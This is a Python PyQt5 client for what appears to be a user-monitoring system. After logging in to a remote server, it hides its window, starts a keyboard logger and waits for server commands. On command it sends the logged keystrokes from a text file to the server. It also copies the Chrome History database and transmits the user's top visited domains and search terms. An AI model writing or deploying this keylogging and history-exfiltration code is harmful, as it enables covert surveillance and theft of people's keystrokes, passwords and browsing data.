# _*_ coding=utf-8 _*_
from logincheck import Ui_MainWindow
from userstatuswork import MyStatus
from usernet import monitorNet,thread_in,keyboard_log
from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox
from PyQt5 import QtCore
import sys,socket,json,platform,psutil,os,sqlite3,shutil

class MyLogin(QMainWindow,Ui_MainWindow):
    def __init__(self):
        super(MyLogin, self).__init__()
        self.setupUi(self)
        self.lineEdit.setAttribute(QtCore.Qt.WA_InputMethodEnabled,False)
        self.lineEdit_2.setAttribute(QtCore.Qt.WA_InputMethodEnabled,False)
        self.status = MyStatus()
        self.status.signal.connect(self.out_log)

        self.userSocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # self.userSocket.connect(('192.168.0.107', 9999))
        #
        # self.thread_in=thread_in(self.userSocket)
        # self.thread_in.signal.connect(self.netreport)

        self.keyboard_get=keyboard_log()
        with open('stop for en.txt') as f1:
            self.stopen=list(map(lambda s:s.strip(),f1.readlines()))
        with open('stop for cn.txt') as f2:
            self.stopcn=list(map(lambda s:s.strip(),f2.readlines()))

        self.net_io=[0,0]

    def __del__(self):
        del self.stopen,self.stopcn
        if self.history_conn:
            self.history_conn.close()
        self.thread_in.terminate()
        self.thread_in.wait()
        self.userSocket.close()
    def out_log(self,in_one):
        self.net_io[:]=(psutil.net_io_counters()[0]-self.net_io[0])/1024/1024,(psutil.net_io_counters()[1]-self.net_io[1])/1024/1024
        # print(self.net_io)
        msg=[{'code':2,'host':in_one[0],'IO':self.net_io,'time':in_one[1]}]
        msg_json=json.dumps(msg)
        self.userSocket.send(msg_json.encode())

    def dealwith_url(self,url):
        parsed_url_components = url.split('//')
        sublevel_split = parsed_url_components[1].split('/', 1)
        if len(sublevel_split[0].split('.')) == 2:
            domain = sublevel_split[0]
        else:
            if len(sublevel_split[0].split('.',1))>1:
                domain = sublevel_split[0].split('.', 1)[1]
            else:domain=sublevel_split[0].split('.',1)[0]
        return domain
    def dealwith_key(self,keyin):
        en_re=''
        for i in keyin:
            if ord(i)<256:en_re+=i
            else:en_re+=' '
        import re,jieba
        uncn = re.compile(r'[\u4e00-\u9fa5]')
        cn_re = ''.join(uncn.findall(keyin))
        temp_cn=jieba.lcut(cn_re,cut_all=False)
        temp_en=en_re.strip().split()
        list_cn=[cni for cni in temp_cn if cni not in self.stopcn]
        list_en=[eni for eni in temp_en if eni not  in self.stopen]
        return list_cn,list_en

    def get_history(self):
        pre_path=os.path.expanduser('~')+r'\AppData\Local\Google\Chrome\User Data\Default'
        history_path=os.path.join(pre_path,'History')
        if os.path.isfile(history_path):
            new_name='copyHistory'
            shutil.copyfile(history_path,new_name)
            self.history_conn=sqlite3.connect(new_name)
            self.history_cursor=self.history_conn.cursor()
            self.history_cursor.execute('select url, visit_count from urls order by id desc limit 400;')
            result=self.history_cursor.fetchall()
            self.history_cursor.execute('select lower_term from keyword_search_terms order by url_id desc limit 400')
            key_result=self.history_cursor.fetchall()
            self.history_cursor.close()
            url_dict={};key_cn_dict={};key_en_dict={}
            for i in result:
                domain=self.dealwith_url(i[0])
                if domain in list(url_dict.keys()):
                    url_dict[domain]+=i[1]
                else:url_dict[domain]=i[1]
            url_sorted=sorted(url_dict.items(),key=lambda x:x[1],reverse=True)
            for k in key_result:
                cn_re,en_re =self.dealwith_key(k[0])
                for cni in cn_re:
                    if cni not in list(key_cn_dict.keys()):
                        key_cn_dict[cni]=1
                    else:key_cn_dict[cni]+=1
                for eni in en_re:
                    if eni not in list(key_en_dict.keys()):
                        key_en_dict[eni]=1
                    else:key_en_dict[eni]+=1
            cn_key_sorted=sorted(key_cn_dict.items(),key=lambda x:x[1],reverse=True)
            en_key_sorted=sorted(key_en_dict.items(),key=lambda d:d[1],reverse=True)
            return url_sorted[:10],cn_key_sorted[:20],en_key_sorted[:20]
        else:
            print('Wrong path!')
            return None

    def netreport(self,one_in):
        print(one_in)
        if one_in[0]['code'] == 88:
            self.monitornet = monitorNet()
            self.monitornet.signal.connect(self.sendnet)
            self.monitornet.start()
        elif one_in[0]['code'] == 55:
            self.monitornet.terminate()
            self.monitornet.wait()
        elif one_in[0]['code']==66:   #键盘记录
            with open('check.txt',encoding='gb18030',errors='ignore') as keyinfo:
                alltext=keyinfo.read()
            msg = [{'code': 67, 'text': alltext}]
            msg_json = json.dumps(msg)
            self.userSocket.send(msg_json.encode())
        elif one_in[0]['code']==77:
            url_sorted,cnkey,enkey=self.get_history()
            if url_sorted !=None:
                msg=[{'code':78,'history':url_sorted,'cnkey':cnkey,'enkey':enkey}]
                msg_json=json.dumps(msg)
                self.userSocket.send(msg_json.encode())
            else:
                pass
                # QMessageBox.warning(self, "Warning", "Wrong path!", QMessageBox.Cancel)

    def checklogin(self):
        hostIP=self.lineEdit_3.text()
        # self.userSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.userSocket.connect((hostIP,9999))
        # self.userSocket.connect(('192.168.0.107', 9999))

        self.thread_in = thread_in(self.userSocket)
        self.thread_in.signal.connect(self.netreport)

        self.usr=self.lineEdit.text()
        self.password=self.lineEdit_2.text()
        #发送认证msg  [{code:100,id:    ,password_m5:  MD5}]
        #认证格式[{code:101}]失败  [{code:99}]成功
        if len(self.usr)>0 and len(self.password)>0:
            import hashlib
            pass_m5 = hashlib.md5(self.password.encode()).hexdigest()
            msg_in=[{'code':100,'id':self.usr,'password_m5':pass_m5}]
            msg_in_json=json.dumps(msg_in)
            print(msg_in_json)
            self.userSocket.send(msg_in_json.encode())
            re_msg_json=self.userSocket.recv(1024).decode('utf-8')
            re_msg=json.loads(re_msg_json)
            if re_msg[0]['code']==99:
                print('get in')
                msg = [{'code': 1, 'host': self.usr, 'info': platform.platform(),
                        'time': QtCore.QTime.currentTime().toString(QtCore.Qt.DefaultLocaleLongDate)}]
                msg_json = json.dumps(msg)
                print(msg_json)
                self.userSocket.send(msg_json.encode())
                self.net_io[:]=psutil.net_io_counters()[:2]
                self.hide()
                self.status.setUsr(self.usr)
                self.status.show()
                self.thread_in.start()
                self.keyboard_get.start()
            else:
                QMessageBox.warning(self, "Warning", "Wrong user or password!", QMessageBox.Cancel)
                self.lineEdit_2.setText('')
        else:QMessageBox.warning(self, "Warning", "Empty user or password!", QMessageBox.Cancel)

    def sendnet(self,one_in):
        msg=[{'code':233,'net':one_in}]
        msg_json=json.dumps(msg)
        self.userSocket.send(msg_json.encode())

if __name__ == '__main__':
    app = QApplication(sys.argv)
    MainWindow = MyLogin()
    MainWindow.show()
    sys.exit(app.exec_())

